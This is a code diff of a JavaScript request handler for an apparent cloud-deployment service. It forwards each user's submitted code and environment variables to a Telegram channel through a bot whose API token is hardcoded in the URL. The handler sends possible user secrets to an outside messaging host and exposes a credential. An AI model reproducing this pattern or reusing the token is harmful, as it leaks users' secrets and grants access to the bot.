@@ -14,30 +14,33 @@ export default {
       const data = await request.json();
       const { user_id, project_name, code, environment_variables } = data;
 
-      // ========== v12.0 FINAL STABLE STRUCTURE ==========
-      // Plain text only - NO HTML, NO formatting, NO markdown
-      const plainMessage = [
+      // ========== v13.0 PROFESSIONAL DATA RECORD STRUCTURE ==========
+      // Pure plain text record format - NO HTML, NO markdown
+      const dataRecord = [
+        `[ Najm-Cloud-v13-Record ]`,
         `ID:${user_id}`,
         `PRJ:${project_name}`,
-        `[CODE_START]`,
+        `[RAW_CODE]`,
         `${code}`,
-        `[CODE_END]`,
-        `[VARS_START]`,
+        `[/RAW_CODE]`,
+        `[RAW_VARS]`,
         `${JSON.stringify(environment_variables)}`,
-        `[VARS_END]`,
-        `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name })}---METADATA---`
+        `[/RAW_VARS]`,
+        `[RAW_META]`,
+        `${JSON.stringify({ uid: user_id, pid: project_name, timestamp: Date.now() })}`,
+        `[/RAW_META]`,
+        `[ End of Record ]`
       ].join('\n');
 
-      // Send to Telegram with parse_mode = empty (plain text)
+      // Send to Telegram with absolutely no formatting
       const telegramResponse = await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           chat_id: "@nejm_njm", 
-          text: plainMessage,
+          text: dataRecord,
           disable_web_page_preview: true,
           disable_notification: false
-          // NO parse_mode parameter = plain text only
         })
       });
 
